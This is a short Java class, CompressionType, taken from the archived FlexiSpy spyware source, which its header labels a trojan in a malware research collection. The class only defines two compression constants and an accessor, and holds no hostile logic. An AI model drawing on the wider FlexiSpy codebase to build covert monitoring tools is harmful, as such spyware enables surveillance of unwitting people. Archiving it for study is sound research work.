/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.prot.command;

public class CompressionType {
	
	public static final CompressionType NO_COMPRESS = new CompressionType(0);
	public static final CompressionType COMPRESS_ALL_METADATA = new CompressionType(1);
	private int id;
	
	private CompressionType(int id) {
		this.id = id;
	}
	
	public int getId() {
		return id;
	}
	
	public boolean equals(CompressionType obj) {
		return this.id == obj.id;
	}
}
